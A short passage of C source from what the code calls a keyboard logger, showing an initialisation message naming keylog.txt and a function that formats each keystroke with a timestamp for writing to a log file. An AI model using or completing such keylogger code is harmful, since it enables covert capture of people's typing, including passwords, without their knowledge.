    } else {
        printf("Keyboard logger initialized. Log file: keylog.txt\n");
    }
}

// Log each keystroke with a timestamp
void LogKeystroke(char key, char* prefix) {
    static char buffer[40];
    time_t now;
    time(&now);
    snprintf(buffer, sizeof(buffer), "[%s] %s %c\n", ctime(&now), prefix, key);
    if (fileHandle) {
